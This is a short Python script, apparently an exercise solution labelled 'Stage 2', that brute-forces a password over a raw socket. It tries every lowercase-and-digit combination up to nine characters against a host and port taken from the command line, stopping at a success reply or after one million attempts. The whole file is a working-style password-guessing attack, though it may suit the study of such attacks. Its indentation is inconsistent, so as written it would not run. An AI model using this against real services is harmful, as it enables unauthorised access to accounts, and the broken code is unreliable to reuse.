# Stage 2, 1,000,000 attempts max. Using Itertools to make passwords and then attempt to brute force the commands

import socket
import sys
import itertools
import string


def main():
  """ Create a connection to the database, pass all possible passwords in, return success or maximum attempts """
  
    host_address = sys.argv[1]
    port = int(sys.argv[2])
    # use itertools.product to generate all possible combinations of letters and digits
    chars = string.ascii_lowercase
    digits = string.digits
    password = ''
    attempts = 0
    maximum_attempts = 1_000_000
    with socket.socket() as new_conn:
        new_conn.connect((host_address, port))
        for i in range(1, 10):
            for combination in itertools.product(chars + digits, repeat=i):
                password = ''.join(combination)
                new_conn.send(password.encode())
                response = new_conn.recv(1024).decode()
                if response == 'Connection success!':
                    print(f"{password}")
                    return
                elif attempts == maximum_attempts:
                    print("Too many attempts")
                    return
                else:
                    attempts += 1
                    continue


if __name__ == '__main__':
    main()
